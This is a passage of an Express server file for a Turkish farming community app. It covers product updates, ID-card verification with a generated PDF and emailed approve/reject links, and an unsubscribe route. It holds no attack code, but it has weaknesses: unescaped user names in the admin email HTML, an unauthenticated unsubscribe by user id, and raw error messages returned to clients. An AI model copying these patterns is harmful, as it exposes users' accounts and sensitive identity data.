            await processImage(files[i].path, out, { width: 1080, height: 1080, fit: 'inside', quality: 78, effort: 4 });
            await fs.unlink(files[i].path).catch(()=>{});
            images.push(`/uploads/posts/${fname}`);
        }
        const id = uuidv4();
        await dbRun(
            `INSERT INTO products (id,"sellerId",name,price,description,image,images,category,stock,"isActive","createdAt","updatedAt")
             VALUES ($1,$2,$3,$4,$5,$6,$7::jsonb,$8,$9,TRUE,NOW(),NOW())`,
            [id, req.user.id, name.substring(0,100), parseFloat(price),
             description?.substring(0,1000)||'', images[0]||null, JSON.stringify(images), category||'', Math.max(0, Math.min(parseInt(stock)||0, 999999))]
        );
        const product = await dbGet(
            `SELECT p.*,u.username AS "sellerName" FROM products p JOIN users u ON p."sellerId"=u.id WHERE p.id=$1`, [id]);
        res.status(201).json({ message: 'Ürün eklendi', product });
    } catch (e) {
        console.error(e);
        if (req.files) for (const f of (Array.isArray(req.files)?req.files:[])) await fs.unlink(f.path).catch(()=>{});
        res.status(500).json({ error: 'Sunucu hatası: ' + e.message });
    }
});

// PUT /api/products/:productId (alias)
app.put('/api/products/:productId', authenticateToken, (req, res, next) => {
    upload.fields([{ name: 'images', maxCount: 5 }, { name: 'image', maxCount: 1 }])(req, res, (err) => {
        if (err) return res.status(400).json({ error: err.message });
        if (req.files && !Array.isArray(req.files)) {
            req.files = [...(req.files['images']||[]), ...(req.files['image']||[])];
        }
        next();
    });
}, async (req, res) => {
    try {
        const p = await dbGet('SELECT "sellerId" FROM products WHERE id=$1', [req.params.productId]);
        if (!p) return res.status(404).json({ error: 'Ürün bulunamadı' });
        if (p.sellerId !== req.user.id) return res.status(403).json({ error: 'Yetki yok' });
        const { name, price, description, category, stock } = req.body;
        const sets=[], vals=[]; let idx=1;
        if (name)        { sets.push(`name=$${idx++}`);        vals.push(name.substring(0,100)); }
        if (price)       { sets.push(`price=$${idx++}`);       vals.push(parseFloat(price)); }
        if (description !== undefined) { sets.push(`description=$${idx++}`); vals.push(description.substring(0,1000)); }
        if (category)    { sets.push(`category=$${idx++}`);    vals.push(category); }
        if (stock !== undefined) { sets.push(`stock=$${idx++}`); vals.push(parseInt(stock)); }
        const files = Array.isArray(req.files) ? req.files : [];
        if (files.length) {
            let imgs=[];
            for (let i=0;i<files.length;i++){
                const fname=`product_${Date.now()}_${i}.webp`;
                const out=require('path').join(postsDir,fname);
                await processImage(files[i].path, out, { width: 1080, height: 1080, fit: 'inside', quality: 78, effort: 4 });
                await fs.unlink(files[i].path).catch(()=>{});
                imgs.push(`/uploads/posts/${fname}`);
            }
            sets.push(`image=$${idx++}`); vals.push(imgs[0]);
            sets.push(`images=$${idx++}::jsonb`); vals.push(JSON.stringify(imgs));
        }
        if (!sets.length) return res.status(400).json({ error: 'Güncellenecek alan yok' });
        sets.push(`"updatedAt"=NOW()`);
        vals.push(req.params.productId);
        await dbRun(`UPDATE products SET ${sets.join(',')} WHERE id=$${idx}`, vals);
        const updated = await dbGet('SELECT * FROM products WHERE id=$1', [req.params.productId]);
        res.json({ message: 'Ürün güncellendi', product: updated });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası: ' + e.message }); }
});

// ═══════════════════════════════════════════════════════════════════════════════
// 🏛️  KİMLİK DOĞRULAMA SİSTEMİ — Resmi PDF + E-posta Onay/Red Butonları
// ═══════════════════════════════════════════════════════════════════════════════

const VERIFICATION_ADMIN_EMAIL = 'noreply.agrolink@gmail.com';
const APP_BASE_URL = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';

// ─── Resmi Görünümlü Doğrulama PDF'i Oluştur ────────────────────────────────
async function buildOfficialVerificationPDF({ frontImagePath, backImagePath, userName, username, email, refCode, createdAt }) {
    const sharpLib = require('sharp');

    // Görsel okuma + JPEG'e normalize et
    const readAsJpeg = async (p) => {
        const raw = await fs.readFile(p);
        const normalized = await sharpLib(raw).jpeg({ quality: 90 }).toBuffer();
        const meta = await sharpLib(normalized).metadata();
        return { buf: normalized, width: meta.width, height: meta.height };
    };

    const front = await readAsJpeg(frontImagePath);
    const back  = await readAsJpeg(backImagePath);

    // A4 sayfa (595 x 842 pt)
    const PW = 595, PH = 842;
    const M  = 40;          // kenar boşluğu
    const IW = PW - 2 * M;  // görsel maksimum genişlik

    // Her görseli IW genişliğine sığdır, orantılı yükseklik
    const scale = (img) => {
        const ratio = IW / img.width;
        return { w: IW, h: Math.round(img.height * ratio) };
    };

    const fDim = scale(front);
    const bDim = scale(back);

    // Görsel tamponlarını boyutlandır
    const fBuf = await sharpLib(front.buf).resize(fDim.w, fDim.h, { fit: 'fill' }).jpeg({ quality: 85 }).toBuffer();
    const bBuf = await sharpLib(back.buf ).resize(bDim.w, bDim.h, { fit: 'fill' }).jpeg({ quality: 85 }).toBuffer();

    const fM = await sharpLib(fBuf).metadata();
    const bM = await sharpLib(bBuf).metadata();

    const dateStr   = new Date(createdAt || Date.now()).toLocaleString('tr-TR');
    const safeStr   = s => (s||'').replace(/[()\\]/g, '').substring(0, 80);

    // ─── PDF Nesneleri ──────────────────────────────────────────────────────
    const objs = [];
    const addRaw = (content) => { objs.push({ type: 'raw', content }); return objs.length; };
    const addStream = (header, stream) => { objs.push({ type: 'stream', header, stream }); return objs.length; };

    // 1 Catalog
    addRaw(`<< /Type /Catalog /Pages 2 0 R >>`);
    // 2 Pages
    addRaw(`<< /Type /Pages /Kids [3 0 R] /Count 1 >>`);

    // 3 Page
    addRaw(`<< /Type /Page /Parent 2 0 R
  /MediaBox [0 0 ${PW} ${PH}]
  /Resources <<
    /XObject << /FImg 4 0 R /BImg 5 0 R >>
    /Font << /F1 6 0 R /F2 7 0 R >>
  >>
  /Contents 8 0 R >>`);

    // 4 Front image
    addStream(
        `<< /Type /XObject /Subtype /Image /Width ${fM.width} /Height ${fM.height} /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length ${fBuf.length} >>`,
        fBuf
    );

    // 5 Back image
    addStream(
        `<< /Type /XObject /Subtype /Image /Width ${bM.width} /Height ${bM.height} /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length ${bBuf.length} >>`,
        bBuf
    );

    // 6 Bold font
    addRaw(`<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>`);
    // 7 Regular font
    addRaw(`<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>`);

    // 8 Page content
    // Layout: başlık alanı → bilgi tablosu → kimlik görselleri
    const HEADER_H = 80;  // yeşil başlık şeridi yüksekliği
    const INFO_H   = 130; // bilgi alanı yüksekliği
    const GAP      = 12;
    const IMG_START_Y = PH - HEADER_H - INFO_H - GAP - GAP;
    const IMG_AREA_H  = IMG_START_Y - M - GAP;
    const IMG_H       = Math.floor((IMG_AREA_H - GAP) / 2);

    // Görselleri bu IMG_H'e sığdır
    const scaleToH = (dim, maxH) => {
        if (dim.h <= maxH) return dim;
        const r = maxH / dim.h;
        return { w: Math.round(dim.w * r), h: maxH };
    };

    const fFinal = scaleToH(fDim, IMG_H);
    const bFinal = scaleToH(bDim, IMG_H);

    const fY = M + IMG_H + GAP;
    const bY = M;

    const ops = [];

    // — Yeşil başlık arka planı —
    ops.push(`0.149 0.541 0.322 rg`); // #269488 yeşil
    ops.push(`0 ${PH - HEADER_H} ${PW} ${HEADER_H} re f`);

    // — Başlık metni —
    ops.push(`1 1 1 rg`); // beyaz
    ops.push(`BT`);
    ops.push(`/F1 18 Tf`);
    ops.push(`${M} ${PH - HEADER_H + 50} Td`);
    ops.push(`(AGROLINK - Kimlik Dogrulama Belgesi) Tj`);
    ops.push(`/F2 10 Tf`);
    ops.push(`0 -18 Td`);
    ops.push(`(Tarim ve Doga Toplulugu | Resmi Dogrulama Talebi) Tj`);
    ops.push(`ET`);

    // — Referans Numarası (sağ üst) —
    ops.push(`BT /F2 8 Tf ${PW - M - 140} ${PH - HEADER_H + 65} Td (Ref: ${safeStr(refCode)}) Tj ET`);
    ops.push(`BT /F2 8 Tf ${PW - M - 140} ${PH - HEADER_H + 50} Td (${dateStr}) Tj ET`);

    // — Bilgi kartı arka planı —
    ops.push(`0.96 0.98 0.97 rg`); // hafif yeşil
    ops.push(`0.149 0.541 0.322 RG`); // yeşil border
    ops.push(`1 w`);
    ops.push(`${M} ${PH - HEADER_H - INFO_H} ${PW - 2*M} ${INFO_H - GAP} re B`);

    // — Bilgi satırları —
    const infoY = PH - HEADER_H - 30;
    const COL2  = M + 160;
    ops.push(`0 0 0 rg 0 0 0 RG`); // siyah
    const infoRows = [
        ['Ad Soyad:',  safeStr(userName)],
        ['Kullanici:',  safeStr('@' + username)],
        ['E-posta:',   safeStr(email)],
        ['Durum:',     'INCELEME BEKLIYOR'],
        ['Talep Tarihi:', dateStr],
    ];
    infoRows.forEach(([label, val], i) => {
        const y = infoY - i * 20;
        ops.push(`BT /F1 9 Tf ${M + 8} ${y} Td (${label}) Tj ET`);
        ops.push(`BT /F2 9 Tf ${COL2} ${y} Td (${val}) Tj ET`);
    });

    // — Bölüm başlığı: Kimlik Görselleri —
    const SEC_Y = PH - HEADER_H - INFO_H - 4;
    ops.push(`0.149 0.541 0.322 rg`);
    ops.push(`${M} ${SEC_Y - 18} ${PW - 2*M} 22 re f`);
    ops.push(`1 1 1 rg`);
    ops.push(`BT /F1 9 Tf ${M+4} ${SEC_Y - 12} Td (T.C. KIMLIK KARTI FOTOGRAFLARI) Tj ET`);

    // — Alt etiketler —
    ops.push(`0 0 0 rg`);
    ops.push(`BT /F1 8 Tf ${M} ${fY + fFinal.h + 4} Td (ON YUZ) Tj ET`);
    ops.push(`BT /F1 8 Tf ${M} ${bY + bFinal.h + 4} Td (ARKA YUZ) Tj ET`);

    // — Görsel çerçeveleri —
    ops.push(`0.8 0.8 0.8 RG 0.5 w`);
    ops.push(`${M} ${fY} ${fFinal.w} ${fFinal.h} re S`);
    ops.push(`${M} ${bY} ${bFinal.w} ${bFinal.h} re S`);

    // — Görselleri yerleştir —
    ops.push(`q ${fFinal.w} 0 0 ${fFinal.h} ${M} ${fY} cm /FImg Do Q`);
    ops.push(`q ${bFinal.w} 0 0 ${bFinal.h} ${M} ${bY} cm /BImg Do Q`);

    // — Alt imza çizgisi —
    ops.push(`0.4 0.4 0.4 rg`);
    ops.push(`BT /F2 7 Tf ${M} 12 Td (Bu belge Agrolink tarafindan otomatik olarak olusturulmustur. Imzasiz kopyalar gecersizdir.) Tj ET`);

    const contentStr = ops.join('\n');
    const contentBuf = Buffer.from(contentStr, 'latin1');
    addStream(`<< /Length ${contentBuf.length} >>`, contentBuf);

    // ─── PDF Binary Montaj ────────────────────────────────────────────────
    const parts  = [Buffer.from('%PDF-1.5\n%\xFF\xFF\xFF\xFF\n')];
    const offsets = [];

    for (let i = 0; i < objs.length; i++) {
        offsets.push(parts.reduce((a, b) => a + b.length, 0));
        const num = i + 1;
        const obj = objs[i];
        if (obj.type === 'stream') {
            parts.push(Buffer.from(`${num} 0 obj\n${obj.header}\nstream\n`));
            parts.push(obj.stream);
            parts.push(Buffer.from('\nendstream\nendobj\n'));
        } else {
            parts.push(Buffer.from(`${num} 0 obj\n${obj.content}\nendobj\n`));
        }
    }

    const xrefStart = parts.reduce((a, b) => a + b.length, 0);
    const xrefLines = [`xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`];
    offsets.forEach(off => xrefLines.push(String(off).padStart(10, '0') + ' 00000 n \n'));
    parts.push(Buffer.from(xrefLines.join('')));
    parts.push(Buffer.from(`trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xrefStart}\n%%EOF\n`));

    return Buffer.concat(parts);
}

// ─── Onay/Red e-postası için HTML ──────────────────────────────────────────
function buildVerificationEmailHTML({ userName, username, email, refCode, approveUrl, rejectUrl, dateStr }) {
    return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Kimlik Doğrulama Talebi</title>
</head>
<body style="margin:0;padding:0;background:#f4f7f6;font-family:Arial,Helvetica,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f7f6;padding:30px 0;">
  <tr><td align="center">
    <table width="600" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,0.08);">

      <!-- HEADER -->
      <tr>
        <td style="background:linear-gradient(135deg,#1a7a4a 0%,#259457 100%);padding:32px 40px;text-align:center;">
          <div style="font-size:32px;margin-bottom:8px;">🌱</div>
          <h1 style="margin:0;color:#ffffff;font-size:22px;font-weight:800;letter-spacing:-0.5px;">Agrolink</h1>
          <p style="margin:4px 0 0;color:rgba(255,255,255,0.85);font-size:13px;">Kimlik Doğrulama Talebi</p>
        </td>
      </tr>

      <!-- ALERT BANNER -->
      <tr>
        <td style="background:#fff8e1;border-left:4px solid #f59e0b;padding:14px 24px;">
          <p style="margin:0;font-size:13px;color:#92400e;">
            ⚠️ <strong>Yönetici İşlemi Gerekiyor</strong> — Bir kullanıcı kimlik doğrulama talebinde bulundu. Kimlik belgesi PDF ekte sunulmaktadır. Lütfen inceleyin ve aşağıdaki butonlardan birini kullanın.
          </p>
        </td>
      </tr>

      <!-- USER INFO -->
      <tr>
        <td style="padding:28px 40px 0;">
          <h2 style="margin:0 0 16px;font-size:16px;color:#1a1a1a;border-bottom:2px solid #e8f5e9;padding-bottom:8px;">📋 Başvuru Bilgileri</h2>
          <table width="100%" cellpadding="6" cellspacing="0" style="font-size:14px;color:#333;">
            <tr>
              <td width="40%" style="color:#666;font-weight:bold;">Ad Soyad:</td>
              <td style="color:#1a1a1a;">${userName || '—'}</td>
            </tr>
            <tr style="background:#f9f9f9;">
              <td style="color:#666;font-weight:bold;">Kullanıcı Adı:</td>
              <td style="color:#1a1a1a;">@${username || '—'}</td>
            </tr>
            <tr>
              <td style="color:#666;font-weight:bold;">E-posta:</td>
              <td style="color:#1a1a1a;">${email || '—'}</td>
            </tr>
            <tr style="background:#f9f9f9;">
              <td style="color:#666;font-weight:bold;">Referans No:</td>
              <td style="color:#1a1a1a;font-family:monospace;font-weight:bold;">${refCode}</td>
            </tr>
            <tr>
              <td style="color:#666;font-weight:bold;">Talep Tarihi:</td>
              <td style="color:#1a1a1a;">${dateStr}</td>
            </tr>
          </table>
        </td>
      </tr>

      <!-- PDF NOTE -->
      <tr>
        <td style="padding:20px 40px 0;">
          <div style="background:#e8f5e9;border-radius:10px;padding:14px 18px;display:flex;align-items:center;gap:10px;">
            <span style="font-size:24px;">📄</span>
            <span style="font-size:13px;color:#2e7d32;">Kimlik kartının ön ve arka yüzü <strong>ekte PDF olarak</strong> gönderilmiştir. Lütfen indirip inceleyin.</span>
          </div>
        </td>
      </tr>

      <!-- ACTION BUTTONS -->
      <tr>
        <td style="padding:28px 40px;">
          <h2 style="margin:0 0 16px;font-size:16px;color:#1a1a1a;border-bottom:2px solid #e8f5e9;padding-bottom:8px;">⚡ Hızlı İşlem</h2>
          <p style="font-size:13px;color:#666;margin:0 0 20px;">Kimlik doğrulaması tamamlandıktan sonra kullanıcıya otomatik olarak e-posta gönderilecektir.</p>
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td width="48%" align="center">
                <a href="${approveUrl}" target="_blank"
                   style="display:block;background:linear-gradient(135deg,#16a34a,#15803d);color:#ffffff;text-decoration:none;padding:16px 24px;border-radius:12px;font-size:16px;font-weight:800;text-align:center;letter-spacing:0.3px;box-shadow:0 4px 12px rgba(22,163,74,0.4);">
                  ✅ ONAYLA
                  <br><span style="font-size:11px;font-weight:400;opacity:0.9;">Mavi tik verilecek</span>
                </a>
              </td>
              <td width="4%"></td>
              <td width="48%" align="center">
                <a href="${rejectUrl}" target="_blank"
                   style="display:block;background:linear-gradient(135deg,#dc2626,#b91c1c);color:#ffffff;text-decoration:none;padding:16px 24px;border-radius:12px;font-size:16px;font-weight:800;text-align:center;letter-spacing:0.3px;box-shadow:0 4px 12px rgba(220,38,38,0.4);">
                  ❌ REDDET
                  <br><span style="font-size:11px;font-weight:400;opacity:0.9;">Başvuru reddedilecek</span>
                </a>
              </td>
            </tr>
          </table>
        </td>
      </tr>

      <!-- SECURITY NOTE -->
      <tr>
        <td style="padding:0 40px 28px;">
          <div style="background:#fef2f2;border:1px solid #fecaca;border-radius:10px;padding:12px 16px;">
            <p style="margin:0;font-size:12px;color:#991b1b;">
              🔒 <strong>Güvenlik:</strong> Bu bağlantılar yalnızca bu talebe özeldir ve tek kullanımlıktır. Bağlantıyı başkasıyla paylaşmayın.
            </p>
          </div>
        </td>
      </tr>

      <!-- FOOTER -->
      <tr>
        <td style="background:#f9fafb;padding:18px 40px;text-align:center;border-top:1px solid #e5e7eb;">
          <p style="margin:0;font-size:12px;color:#9ca3af;">Bu e-posta Agrolink sisteminden otomatik olarak gönderilmiştir.</p>
          <p style="margin:4px 0 0;font-size:12px;color:#9ca3af;">© ${new Date().getFullYear()} Agrolink Tarım Topluluğu</p>
        </td>
      </tr>

    </table>
  </td></tr>
</table>
</body>
</html>`;
}

// ─── Kullanıcıya gönderilecek onay/red bildirimi ──────────────────────────
function buildUserResultEmail(approved, userName) {
    const color  = approved ? '#16a34a' : '#dc2626';
    const icon   = approved ? '✅' : '❌';
    const status = approved ? 'Onaylandı' : 'Reddedildi';
    const msg    = approved
        ? 'Kimliğiniz başarıyla doğrulandı! Profilinizde artık <strong>mavi tik (✓)</strong> görünecektir. Topluluğa güvenilir bir üye olarak hoş geldiniz!'
        : 'Kimlik doğrulama başvurunuz maalesef reddedildi. Belgelerinizin net ve okunaklı olduğundan emin olarak yeniden başvurabilirsiniz.';

    return `<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;background:#f4f7f6;font-family:Arial,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f7f6;padding:30px 0;">
  <tr><td align="center">
    <table width="560" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,0.08);">
      <tr>
        <td style="background:${color};padding:28px 40px;text-align:center;">
          <div style="font-size:40px;">${icon}</div>
          <h1 style="margin:8px 0 0;color:#fff;font-size:20px;">Doğrulama Başvurusu ${status}</h1>
        </td>
      </tr>
      <tr>
        <td style="padding:28px 40px;">
          <p style="color:#333;font-size:15px;">Merhaba <strong>${userName || ''}</strong>,</p>
          <p style="color:#555;font-size:14px;line-height:1.6;">${msg}</p>
          ${approved ? `<div style="text-align:center;margin:24px 0;"><a href="${APP_BASE_URL}" style="background:#16a34a;color:#fff;text-decoration:none;padding:14px 32px;border-radius:10px;font-weight:bold;font-size:15px;">Profilimi Görüntüle</a></div>` : ''}
        </td>
      </tr>
      <tr>
        <td style="background:#f9fafb;padding:16px 40px;text-align:center;border-top:1px solid #e5e7eb;">
          <p style="margin:0;font-size:12px;color:#9ca3af;">© ${new Date().getFullYear()} Agrolink Tarım Topluluğu</p>
        </td>
      </tr>
    </table>
  </td></tr>
</table>
</body></html>`;
}

// ─── Uploads klasöründe kalıcı verif klasörü ─────────────────────────────
const verifDir = path.join(__dirname, 'uploads', 'verifications');
fssync.mkdirSync(verifDir, { recursive: true });

// ─── POST /api/verification/request ────────────────────────────────────────
app.post('/api/verification/request', authenticateToken, upload.fields([
    { name: 'frontImage', maxCount: 1 },
    { name: 'backImage',  maxCount: 1 }
]), async (req, res) => {
    const frontFile = req.files?.frontImage?.[0];
    const backFile  = req.files?.backImage?.[0];
    const { name, surname } = req.body;
    const userName = [name, surname].filter(Boolean).join(' ');

    try {
        const user = await dbGet('SELECT email, username FROM users WHERE id=$1', [req.user.id]);

        // Mevcut pending talebi kontrol et
        const existing = await dbGet(
            `SELECT id FROM verification_requests WHERE "userId"=$1 AND status='pending'`,
            [req.user.id]
        ).catch(() => null);
        if (existing) {
            // Geçici dosyaları temizle
            [frontFile?.path, backFile?.path].filter(Boolean).forEach(p => fs.unlink(p).catch(()=>{}));
            return res.status(429).json({ error: 'Zaten inceleme bekleyen bir başvurunuz var.' });
        }

        // Görselleri kalıcı klasöre taşı
        const refCode = crypto.randomBytes(8).toString('hex').toUpperCase();
        const token   = crypto.randomBytes(32).toString('hex');
        const fDest   = path.join(verifDir, `${refCode}-front.jpg`);
        const bDest   = path.join(verifDir, `${refCode}-back.jpg`);

        if (frontFile) await fs.rename(frontFile.path, fDest).catch(async () => { await fs.copyFile(frontFile.path, fDest); await fs.unlink(frontFile.path).catch(()=>{}); });
        if (backFile)  await fs.rename(backFile.path,  bDest).catch(async () => { await fs.copyFile(backFile.path,  bDest); await fs.unlink(backFile.path).catch(()=>{}); });

        // DB kaydı oluştur
        await dbRun(
            `INSERT INTO verification_requests (id, "userId", token, status, name, surname, "frontImagePath", "backImagePath", "createdAt", "updatedAt")
             VALUES ($1,$2,$3,'pending',$4,$5,$6,$7,NOW(),NOW())`,
            [uuidv4(), req.user.id, token, name||'', surname||'', fDest, bDest]
        );

        // PDF üret
        let pdfBuf = null;
        try {
            pdfBuf = await buildOfficialVerificationPDF({
                frontImagePath: fDest, backImagePath: bDest,
                userName, username: user?.username, email: user?.email,
                refCode, createdAt: new Date()
            });
            // PDF'i kaydet
            const pdfPath = path.join(verifDir, `${refCode}-verification.pdf`);
            await fs.writeFile(pdfPath, pdfBuf);
            await dbRun(`UPDATE verification_requests SET "pdfPath"=$1 WHERE token=$2`, [pdfPath, token]).catch(()=>{});
        } catch (pdfErr) {
            console.error('PDF oluşturma hatası:', pdfErr.message);
        }

        // Onay/Red URL'leri
        const approveUrl = `${APP_BASE_URL}/api/verification/action/${token}/approve`;
        const rejectUrl  = `${APP_BASE_URL}/api/verification/action/${token}/reject`;
        const dateStr    = new Date().toLocaleString('tr-TR');

        const emailHtml = buildVerificationEmailHTML({
            userName, username: user?.username, email: user?.email,
            refCode, approveUrl, rejectUrl, dateStr
        });

        const attachments = [];
        if (pdfBuf) attachments.push({ filename: `agrolink-kimlik-${refCode}.pdf`, content: pdfBuf });

        const transporter = getEmailTransporter();
        if (transporter) {
            await transporter.sendMail({
                from: `Agrolink Sistem <${process.env.SMTP_USER || process.env.EMAIL_USER}>`,
                to: VERIFICATION_ADMIN_EMAIL,
                subject: `🌱 Kimlik Doğrulama Talebi — ${userName} (@${user?.username}) [${refCode}]`,
                html: emailHtml,
                attachments
            }).then(() => console.log('📧 Kimlik doğrulama maili gönderildi, ref:', refCode))
              .catch(err => console.error('📧 Mail hatası:', err.message));
        } else {
            console.warn('📧 E-posta yapılandırması eksik, mail gönderilemedi.');
        }

        res.json({ message: 'Başvurunuz alındı! Ekibimiz inceleyecek ve e-posta ile bilgilendirileceksiniz.', refCode, pending: true });
    } catch (e) {
        console.error('Verification request hatası:', e);
        [frontFile?.path, backFile?.path].filter(Boolean).forEach(p => fs.unlink(p).catch(()=>{}));
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── GET /api/verification/action/:token/:action ──────────────────────────
// E-postadaki butonlara tıklanınca çağrılır (approve veya reject)
app.get('/api/verification/action/:token/:action', async (req, res) => {
    const { token, action } = req.params;
    if (!['approve', 'reject'].includes(action)) return res.status(400).send('Geçersiz işlem.');

    const approved = action === 'approve';

    try {
        const vReq = await dbGet(
            `SELECT vr.*, u.email, u.username, u."isVerified", vr."userId"
             FROM verification_requests vr
             JOIN users u ON u.id = vr."userId"
             WHERE vr.token = $1`,
            [token]
        ).catch((err) => { console.error('Verification lookup hatası:', err.message); return null; });

        if (!vReq) {
            return res.status(404).send(buildActionResultPage(false, 'Talep bulunamadı veya geçersiz bağlantı.'));
        }

        if (vReq.status !== 'pending') {
            const msg = vReq.status === 'approved' ? 'Bu talep zaten onaylanmıştı.' : 'Bu talep zaten reddedilmişti.';
            return res.send(buildActionResultPage(vReq.status === 'approved', msg, true));
        }

        // DB güncelle
        await dbRun(
            `UPDATE verification_requests SET status=$1, "reviewedAt"=NOW(), "updatedAt"=NOW() WHERE token=$2`,
            [approved ? 'approved' : 'rejected', token]
        );

        if (approved) {
            await dbRun(`UPDATE users SET "isVerified"=TRUE, "updatedAt"=NOW() WHERE id=$1`, [vReq['userId'] || vReq.userId]);
        }

        // Kullanıcıya bildirim maili gönder
        const userName = [vReq.name, vReq.surname].filter(Boolean).join(' ') || vReq.username;
        const transporter = getEmailTransporter();
        if (transporter && vReq.email) {
            await transporter.sendMail({
                from: `Agrolink <${process.env.SMTP_USER || process.env.EMAIL_USER}>`,
                to: vReq.email,
                subject: approved
                    ? '✅ Kimlik Doğrulamanız Onaylandı — Agrolink'
                    : '❌ Kimlik Doğrulama Başvurunuz Reddedildi — Agrolink',
                html: buildUserResultEmail(approved, userName)
            }).catch(err => console.error('Kullanıcı bildirim hatası:', err.message));
        }

        console.log(`🏅 Doğrulama ${approved ? 'ONAYLANDI' : 'REDDEDİLDİ'}: @${vReq.username}`);

        res.send(buildActionResultPage(approved,
            approved
                ? `✅ @${vReq.username} kullanıcısı başarıyla doğrulandı. Mavi tik verildi.`
                : `❌ @${vReq.username} kullanıcısının başvurusu reddedildi.`
        ));
    } catch (e) {
        console.error('Verification action hatası:', e);
        res.status(500).send(buildActionResultPage(false, 'Sunucu hatası: ' + e.message));
    }
});

// ─── Onay/Red sonuç sayfası HTML ──────────────────────────────────────────
function buildActionResultPage(success, message, alreadyDone = false) {
    const color = success ? '#16a34a' : '#dc2626';
    const icon  = success ? '✅' : (alreadyDone ? 'ℹ️' : '❌');
    return `<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Agrolink - İşlem Sonucu</title></head>
<body style="margin:0;padding:0;background:#f4f7f6;font-family:Arial,sans-serif;display:flex;min-height:100vh;align-items:center;justify-content:center;">
<div style="background:#fff;border-radius:20px;padding:48px 40px;max-width:440px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.12);">
  <div style="font-size:56px;margin-bottom:16px;">${icon}</div>
  <h1 style="margin:0 0 12px;font-size:20px;color:#1a1a1a;">İşlem Tamamlandı</h1>
  <p style="margin:0 0 28px;font-size:15px;color:#555;line-height:1.6;">${message}</p>
  <div style="width:60px;height:4px;background:${color};border-radius:2px;margin:0 auto 28px;"></div>
  <p style="margin:0;font-size:13px;color:#9ca3af;">Bu sekmeyi kapatabilirsiniz.</p>
  <p style="margin:8px 0 0;font-size:12px;color:#d1d5db;">🌱 Agrolink Tarım Topluluğu</p>
</div>
</body></html>`;
}

// ─── POST /api/verification/remove ─────────────────────────────────────────
app.post('/api/verification/remove', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet('SELECT email, username, "isVerified" FROM users WHERE id=$1', [req.user.id]);
        if (!user?.isVerified) return res.status(400).json({ error: 'Hesabınız zaten doğrulanmış değil' });

        await dbRun('UPDATE users SET "isVerified"=FALSE, "updatedAt"=NOW() WHERE id=$1', [req.user.id]);
        await dbRun(`UPDATE verification_requests SET status='removed', "updatedAt"=NOW() WHERE "userId"=$1 AND status='approved'`, [req.user.id]).catch(()=>{});

        const html = `<p>Kullanıcı <strong>@${user.username}</strong> doğrulanmış rozetini kaldırdı. Tarih: ${new Date().toLocaleString('tr-TR')}</p>`;
        const transporter = getEmailTransporter();
        if (transporter) {
            await transporter.sendMail({
                from: `Agrolink <${process.env.SMTP_USER || process.env.EMAIL_USER}>`,
                to: VERIFICATION_ADMIN_EMAIL,
                subject: `🏅 Rozet Kaldırıldı — @${user.username}`,
                html
            }).catch(err => console.error('Rozet kaldırma mail hatası:', err.message));
        }

        res.json({ message: 'Doğrulanmış rozet kaldırıldı', isVerified: false });
    } catch (e) {
        console.error('Verification remove hatası:', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});
app.post('/api/users/verification/apply', authenticateToken, upload.fields([
    { name: 'idDocument', maxCount: 1 }, { name: 'selfie', maxCount: 1 }
]), async (req, res) => {
    try {
        const { applicationType, reason } = req.body;
        // Basit: verified olarak işaretle (admin onayı olmadan)
        const user = await dbGet('SELECT "isVerified" FROM users WHERE id=$1', [req.user.id]);
        if (user?.isVerified) return res.json({ message: 'Hesabınız zaten doğrulanmış', isVerified: true });
        // Dosyaları temizle
        if (req.files) {
            const allFiles = [...(req.files['idDocument']||[]), ...(req.files['selfie']||[])];
            for (const f of allFiles) await fs.unlink(f.path).catch(()=>{});
        }
        res.json({ message: 'Doğrulama başvurunuz alındı. İnceleme sonucu e-posta ile bildirilecektir.', pending: true });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/email/unsubscribe/:userId (POST alias)
app.post('/api/email/unsubscribe/:userId', async (req, res) => {
    try {
        await dbRun('UPDATE users SET "emailNotifications"=FALSE,"updatedAt"=NOW() WHERE id=$1', [req.params.userId]).catch(()=>{});
        res.json({ message: 'E-posta bildirimlerinden çıkıldı' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// =============================================================================
// 🔑 AGRO DEV — API KEY YÖNETİMİ
// =============================================================================
//
// Tablo (migration sırasında otomatik oluşturulur):
//   CREATE TABLE IF NOT EXISTS dev_api_keys (
//     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
//     "userId" UUID REFERENCES users(id) ON DELETE CASCADE,
//     name TEXT NOT NULL,
//     key TEXT UNIQUE NOT NULL,
//     "isActive" BOOLEAN DEFAULT TRUE,
//     "usageCount" INTEGER DEFAULT 0,
//     "lastUsedAt" TIMESTAMPTZ,
//     "createdAt" TIMESTAMPTZ DEFAULT NOW()
//   );
//
// Middleware: X-API-Key header ile doğrulama
// =============================================================================

// ── DB tablo oluşturma (sunucu başlarken çağrılacak) ──────────────────────
